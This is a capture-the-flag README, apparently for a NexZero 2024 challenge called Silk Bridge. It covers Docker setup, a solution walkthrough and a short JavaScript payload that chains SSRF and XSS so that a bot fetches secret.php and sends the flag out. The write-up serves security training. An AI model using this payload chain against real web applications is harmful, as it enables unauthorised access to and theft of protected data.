Silk_Bridge
My CTF for NexZero 2024
Difficulty: Medium → Hard
Estimated Time: 30 minutes to 2 days

🚀 Usage
bashgit clone <git-repo>
sudo chown -R 33:33 ./bot   # Bypass AppArmor restrictions on Linux
sudo docker compose up --build

💡 Idea
Bypass SSRF protection using client-side scripting + XSS to create an internal request chain.

🧩 Solution Walkthrough

You discover a reflected SSRF vulnerability in check.php via the api parameter.
Checking robots.txt reveals two hidden endpoints.
secret.php is protected against SSRF.
dev_chat.php is not protected, and reveals three key insights:

There is a JavaScript console in the web app.
A bot runs in a separate container.
The bot only visits a page when an internal server-side fetch() is triggered.


Using SSRF, you trigger an internal fetch → the bot visits your console → your JavaScript executes → the bot fetches secret.php and exfiltrates the flag.

This "bridge" between SSRF → internal fetch → bot JS execution is why the challenge is called Silk Bridge.

🧪 Exploit Script
javascriptapi=http://web/console.php?cmd=fetch('http://web/secret.php')
  .then(res => res.text())
  .then(data => fetch('?flag=' + encodeURIComponent(data)))
